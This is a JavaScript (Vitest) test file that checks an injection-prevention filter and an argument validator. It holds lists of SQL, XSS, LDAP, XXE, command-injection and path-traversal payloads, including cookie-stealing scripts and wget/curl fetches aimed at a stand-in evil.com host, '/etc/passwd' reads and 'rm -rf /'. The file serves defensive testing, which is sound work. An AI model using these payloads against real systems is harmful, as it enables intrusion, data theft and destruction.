/**
 * Comprehensive Input Sanitization Tests
 * Tests input validation and sanitization across all attack vectors
 */

import { describe, it, expect, beforeEach } from 'vitest';
import { InjectionPreventionFilter } from '../../src/security/protection/injection-prevention.js';
import { ArgumentValidator } from '../../src/lib/validation/ArgumentValidator.js';

describe('Input Sanitization Comprehensive Tests', () => {
  let injectionFilter;
  let argumentValidator;

  beforeEach(async () => {
    injectionFilter = new InjectionPreventionFilter();
    await injectionFilter.initialize();
    
    argumentValidator = new ArgumentValidator({
      strict: true,
      enableSuggestions: true,
      enableWarnings: true
    });
  });

  describe('SQL Injection Prevention', () => {
    const sqlInjectionPayloads = [
      // Classic SQL injection
      "'; DROP TABLE users; --",
      "' OR '1'='1",
      "' OR 1=1 --",
      "' UNION SELECT * FROM users --",
      "'; DELETE FROM users WHERE 1=1; --",
      
      // Blind SQL injection
      "' AND (SELECT COUNT(*) FROM users) > 0 --",
      "' AND (SELECT SUBSTRING(password,1,1) FROM users WHERE username='admin')='a",
      
      // Time-based SQL injection
      "'; WAITFOR DELAY '00:00:05' --",
      "' OR IF(1=1, SLEEP(5), 0) --",
      "'; pg_sleep(5) --",
      
      // Advanced SQL injection
      "' OR (SELECT COUNT(*) FROM information_schema.tables) > 0 --",
      "' UNION SELECT null,version(),null --",
      "' AND (SELECT * FROM (SELECT COUNT(*),concat(database(),floor(rand(0)*2))x FROM information_schema.tables GROUP BY x)a) --",
      
      // NoSQL injection
      "'; return true; var x='",
      "'; return this.username == 'admin'; var y='",
      
      // ORM injection
      "'; User.find({$where: 'return true'}); var z='",
      
      // Encoded SQL injection
      "%27%20OR%20%271%27%3D%271",
      "&#39; OR &#39;1&#39;=&#39;1",
      
      // Unicode SQL injection
      "'; \u0044\u0052\u004F\u0050 \u0054\u0041\u0042\u004C\u0045 users; --"
    ];

    it('should detect all SQL injection variants', async () => {
      for (const payload of sqlInjectionPayloads) {
        const result = await injectionFilter.validateString(payload, 'sql-input');
        expect(result.isClean, `SQL injection should be blocked: ${payload}`).toBe(false);
        expect(result.threats.some(t => t.type === 'sql-injection')).toBe(true);
      }
    });

    it('should sanitize SQL injection attempts', async () => {
      const testCases = [
        { input: "'; DROP TABLE users; --", shouldNotContain: ['DROP', 'TABLE', '--'] },
        { input: "' OR '1'='1", shouldNotContain: ['OR', "'1'='1'"] },
        { input: "' UNION SELECT", shouldNotContain: ['UNION', 'SELECT'] }
      ];

      for (const test of testCases) {
        const result = await injectionFilter.validateString(test.input, 'sql-sanitize');
        expect(result.isClean).toBe(false);
        
        for (const forbidden of test.shouldNotContain) {
          expect(result.sanitizedValue.toUpperCase()).not.toContain(forbidden.toUpperCase());
        }
      }
    });
  });

  describe('XSS Prevention and HTML Sanitization', () => {
    const xssPayloads = [
      // Script-based XSS
      '<script>alert("XSS")</script>',
      '<script src="http://evil.com/xss.js"></script>',
      '<script>document.location="http://evil.com/steal?cookie="+document.cookie</script>',
      
      // Event handler XSS
      '<img src="x" onerror="alert(\'XSS\')">',
      '<svg onload="alert(1)">',
      '<body onload="alert(1)">',
      '<div onclick="alert(1)">Click me</div>',
      '<input type="text" onfocus="alert(1)">',
      
      // JavaScript URLs
      '<a href="javascript:alert(1)">Click</a>',
      '<iframe src="javascript:alert(1)"></iframe>',
      '<object data="javascript:alert(1)"></object>',
      
      // CSS-based XSS
      '<style>body{background:url("javascript:alert(1)")}</style>',
      '<div style="background:url(javascript:alert(1))">',
      '<div style="expression(alert(1))">',
      
      // DOM-based XSS
      '<img src="x" onerror="this.src=\'http://evil.com/steal?\'+document.cookie">',
      '<script>eval(location.hash.substr(1))</script>',
      
      // Filter evasion
      '<SCrIpT>alert(1)</ScRiPt>',
      '<script>alert(String.fromCharCode(88,83,83))</script>',
      '<img/src="x"/onerror="alert(1)">',
      '<svg><script>alert(1)</script></svg>',
      
      // Encoded XSS
      '%3Cscript%3Ealert%281%29%3C%2Fscript%3E',
      '&lt;script&gt;alert(1)&lt;/script&gt;',
      '&#60;script&#62;alert(1)&#60;/script&#62;',
      
      // Data URI XSS
      'data:text/html,<script>alert(1)</script>',
      'data:text/html;base64,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg==',
      
      // Polyglot XSS
      'javascript:/*--></title></style></textarea></script></xmp><svg/onload=\'+/"/+/onmouseover=1/+/[*/[]/+alert(1)//\'>',
      
      // Advanced XSS
      '<object type="text/html" data="data:text/html;base64,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg=="></object>',
      '<embed src="data:text/html;base64,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg=="></embed>'
    ];

    it('should detect all XSS variants', async () => {
      for (const payload of xssPayloads) {
        const result = await injectionFilter.validateString(payload, 'xss-input');
        expect(result.isClean, `XSS should be blocked: ${payload}`).toBe(false);
        expect(result.threats.some(t => t.type === 'xss')).toBe(true);
      }
    });

    it('should properly encode HTML entities', async () => {
      const htmlTests = [
        { input: '<script>alert(1)</script>', expected: '&lt;script&gt;alert(1)&lt;/script&gt;' },
        { input: '"><script>alert(1)</script>', expected: '&quot;&gt;&lt;script&gt;alert(1)&lt;/script&gt;' },
        { input: "'><script>alert(1)</script>", expected: '&#x27;&gt;&lt;script&gt;alert(1)&lt;/script&gt;' },
        { input: '&<>"\'', expected: '&amp;&lt;&gt;&quot;&#x27;' }
      ];

      for (const test of htmlTests) {
        const result = await injectionFilter.validateString(test.input, 'html-encode');
        expect(result.isClean).toBe(false);
        expect(result.sanitizedValue).toContain(test.expected.substring(0, 10)); // Check partial match
      }
    });

    it('should remove dangerous protocols', async () => {
      const protocolTests = [
        { input: 'javascript:alert(1)', shouldNotContain: 'javascript:' },
        { input: 'vbscript:msgbox(1)', shouldNotContain: 'vbscript:' },
        { input: 'data:text/html,<script>', shouldNotContain: 'data:' }
      ];

      for (const test of protocolTests) {
        const result = await injectionFilter.validateString(test.input, 'protocol-check');
        expect(result.isClean).toBe(false);
        expect(result.sanitizedValue.toLowerCase()).not.toContain(test.shouldNotContain);
      }
    });
  });

  describe('LDAP Injection Prevention', () => {
    const ldapInjectionPayloads = [
      // Basic LDAP injection
      '*)(cn=*',
      '*)(mail=*',
      '*)(objectClass=*',
      
      // LDAP filter bypass
      '*)(&(objectClass=user)',
      '*))%00',
      '*)|(mail=*',
      
      // LDAP enumeration
      '*)(|(cn=a*)(cn=b*)(cn=c*',
      '*)(userAccountControl=*',
      
      // Advanced LDAP injection
      '*)(&(objectClass=user)(|(cn=admin)(cn=Administrator))',
      '*)(|(objectClass=user)(objectClass=computer))'
    ];

    it('should detect LDAP injection attempts', async () => {
      for (const payload of ldapInjectionPayloads) {
        const result = await injectionFilter.validateString(payload, 'ldap-input');
        expect(result.isClean, `LDAP injection should be blocked: ${payload}`).toBe(false);
      }
    });
  });

  describe('XML/XXE Injection Prevention', () => {
    const xmlInjectionPayloads = [
      // Basic XXE
      '<?xml version="1.0"?><!DOCTYPE root [<!ENTITY test SYSTEM "file:///etc/passwd">]><root>&test;</root>',
      
      // External entity
      '<!DOCTYPE test [<!ENTITY xxe SYSTEM "http://evil.com/evil.dtd">]><test>&xxe;</test>',
      
      // Parameter entity
      '<!DOCTYPE test [<!ENTITY % xxe SYSTEM "http://evil.com/evil.dtd">%xxe;]>',
      
      // Billion laughs
      '<?xml version="1.0"?><!DOCTYPE lolz [<!ENTITY lol "lol"><!ENTITY lol2 "&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;"><!ENTITY lol3 "&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;">]><lolz>&lol3;</lolz>',
      
      // SOAP injection
      '</soap:Body></soap:Envelope><soap:Envelope><soap:Body><arbitrary>injected</arbitrary></soap:Body></soap:Envelope><!--'
    ];

    it('should detect XML injection attempts', async () => {
      for (const payload of xmlInjectionPayloads) {
        const result = await injectionFilter.validateString(payload, 'xml-input');
        expect(result.isClean, `XML injection should be blocked: ${payload}`).toBe(false);
      }
    });
  });

  describe('Command Injection Prevention', () => {
    const commandInjectionPayloads = [
      // Shell metacharacters
      '; ls -la',
      '| cat /etc/passwd',
      '& whoami',
      '&& rm -rf /',
      '|| format C:',
      
      // Command substitution
      '`whoami`',
      '$(id)',
      '`cat /etc/passwd`',
      
      // Redirection
      '> /tmp/evil',
      '< /etc/passwd',
      '>> /var/log/malicious',
      
      // Environment variables
      '$PATH',
      '${HOME}',
      '$USER/../../../etc/passwd',
      
      // Encoded injection
      '%3B%20ls%20-la',
      '%26%26%20rm%20-rf%20%2F',
      
      // PowerShell injection
      '; Get-Process',
      '| Get-Content C:\\Windows\\System32\\drivers\\etc\\hosts',
      '; Invoke-Expression',
      
      // Network commands
      '; nc -l 1234',
      '| wget http://evil.com/shell',
      '& curl http://evil.com/payload'
    ];

    it('should detect command injection attempts', async () => {
      for (const payload of commandInjectionPayloads) {
        const result = await injectionFilter.validateString(payload, 'command-input');
        expect(result.isClean, `Command injection should be blocked: ${payload}`).toBe(false);
        expect(result.threats.some(t => t.type === 'command-injection')).toBe(true);
      }
    });

    it('should sanitize shell metacharacters', async () => {
      const shellChars = ['|', '&', ';', '`', '$', '(', ')', '{', '}', '[', ']'];
      
      for (const char of shellChars) {
        const payload = `test${char}malicious`;
        const result = await injectionFilter.validateString(payload, 'shell-sanitize');
        expect(result.isClean).toBe(false);
        expect(result.sanitizedValue).not.toContain(char);
      }
    });
  });

  describe('Path Traversal Prevention', () => {
    const pathTraversalPayloads = [
      // Basic traversal
      '../../../etc/passwd',
      '..\\..\\..\\windows\\system32\\config\\sam',
      
      // URL encoded
      '%2e%2e%2f%2e%2e%2fetc%2fpasswd',
      '%2e%2e%5c%2e%2e%5cwindows%5csystem32',
      
      // Double encoding
      '%252e%252e%252fetc%252fpasswd',
      
      // Unicode
      '\u002e\u002e\u002fetc\u002fpasswd',
      
      // Null byte
      '../../../etc/passwd\0',
      '/etc/passwd%00.txt',
      
      // Multiple slashes
      '....//....//etc//passwd',
      
      // Mixed separators
      '../..\\..\\etc/passwd'
    ];

    it('should detect path traversal attempts', async () => {
      for (const payload of pathTraversalPayloads) {
        const result = await injectionFilter.validateString(payload, 'path-input');
        expect(result.isClean, `Path traversal should be blocked: ${payload}`).toBe(false);
        expect(result.threats.some(t => t.type === 'path-traversal')).toBe(true);
      }
    });

    it('should sanitize path components', async () => {
      const pathTests = [
        { input: '../../../etc/passwd', shouldNotContain: '..' },
        { input: '/etc/passwd', shouldNotContain: '/' },
        { input: '\\windows\\system32', shouldNotContain: '\\' },
        { input: 'test\0file', shouldNotContain: '\0' }
      ];

      for (const test of pathTests) {
        const result = await injectionFilter.validateString(test.input, 'path-sanitize');
        expect(result.isClean).toBe(false);
        expect(result.sanitizedValue).not.toContain(test.shouldNotContain);
      }
    });
  });

  describe('Input Length and Size Validation', () => {
    it('should handle extremely long inputs', async () => {
      const longInput = 'A'.repeat(100000) + '<script>alert(1)</script>';
      const startTime = performance.now();
      
      const result = await injectionFilter.validateString(longInput, 'long-input');
      const endTime = performance.now();
      
      expect(result.isClean).toBe(false);
      expect(endTime - startTime).toBeLessThan(5000); // Should complete within 5 seconds
    });

    it('should prevent DoS via complex regex patterns', async () => {
      const complexInput = '('.repeat(10000) + 'a' + ')'.repeat(10000);
      const startTime = performance.now();
      
      const result = await injectionFilter.validateString(complexInput, 'complex-input');
      const endTime = performance.now();
      
      expect(endTime - startTime).toBeLessThan(1000); // Should not hang
    });
  });

  describe('Argument Validation', () => {
    it('should validate command line arguments', async () => {
      const maliciousArgs = {
        positionals: ['../../../etc/passwd', 'malware.exe'],
        flags: {
          output: '; rm -rf /',
          config: '<script>alert(1)</script>'
        },
        variables: {
          name: "'; DROP TABLE users; --",
          path: '../../../sensitive'
        }
      };

      const result = await argumentValidator.validate(maliciousArgs);
      expect(result.valid).toBe(false);
      expect(result.errors.length).toBeGreaterThan(0);
    });

    it('should provide helpful error messages', async () => {
      const invalidArgs = {
        positionals: [],
        flags: { unknown: 'value' },
        variables: { required: undefined }
      };

      const result = await argumentValidator.validate(invalidArgs);
      expect(result.valid).toBe(false);
      expect(result.suggestions.length).toBeGreaterThan(0);
    });
  });

  describe('Content-Type Based Validation', () => {
    it('should apply different rules based on content type', async () => {
      const payload = '<script>alert(1)</script>';
      
      // HTML content - should escape
      const htmlResult = await injectionFilter.validateString(payload, 'html-content');
      expect(htmlResult.isClean).toBe(false);
      expect(htmlResult.sanitizedValue).toContain('&lt;');
      
      // JSON content - should reject
      const jsonResult = await injectionFilter.validateString(payload, 'json-content');
      expect(jsonResult.isClean).toBe(false);
      
      // Plain text - should sanitize
      const textResult = await injectionFilter.validateString(payload, 'text-content');
      expect(textResult.isClean).toBe(false);
    });
  });

  describe('Performance Under Load', () => {
    it('should handle concurrent validation requests', async () => {
      const payloads = Array(100).fill(0).map((_, i) => `<script>alert(${i})</script>`);
      const startTime = performance.now();
      
      const results = await Promise.all(
        payloads.map(payload => injectionFilter.validateString(payload, 'concurrent-test'))
      );
      
      const endTime = performance.now();
      
      // All should be blocked
      expect(results.every(r => !r.isClean)).toBe(true);
      
      // Should complete in reasonable time
      expect(endTime - startTime).toBeLessThan(10000);
    });

    it('should maintain memory efficiency', async () => {
      const initialMemory = process.memoryUsage().heapUsed;
      
      // Process many inputs
      for (let i = 0; i < 1000; i++) {
        await injectionFilter.validateString(`<script>alert(${i})</script>`, 'memory-test');
      }
      
      const finalMemory = process.memoryUsage().heapUsed;
      const memoryIncrease = (finalMemory - initialMemory) / 1024 / 1024; // MB
      
      // Memory increase should be reasonable (less than 50MB)
      expect(memoryIncrease).toBeLessThan(50);
    });
  });

  describe('Edge Cases and Error Handling', () => {
    it('should handle null and undefined inputs gracefully', async () => {
      const edgeCases = [null, undefined, '', 0, false, {}, []];
      
      for (const input of edgeCases) {
        const result = await injectionFilter.validateString(input, 'edge-case');
        expect(result).toBeDefined();
        expect(result.isClean).toBeDefined();
        expect(result.threats).toBeDefined();
      }
    });

    it('should handle binary and non-UTF8 data', async () => {
      const binaryData = Buffer.from([0x00, 0x01, 0x02, 0xFF]).toString();
      const result = await injectionFilter.validateString(binaryData, 'binary-data');
      
      expect(result).toBeDefined();
      expect(result.isClean).toBe(false); // Binary data should be flagged
    });

    it('should provide consistent results for same input', async () => {
      const testInput = '<script>alert(1)</script>';
      
      const result1 = await injectionFilter.validateString(testInput, 'consistency-test');
      const result2 = await injectionFilter.validateString(testInput, 'consistency-test');
      
      expect(result1.isClean).toBe(result2.isClean);
      expect(result1.threats.length).toBe(result2.threats.length);
      expect(result1.sanitizedValue).toBe(result2.sanitizedValue);
    });
  });
});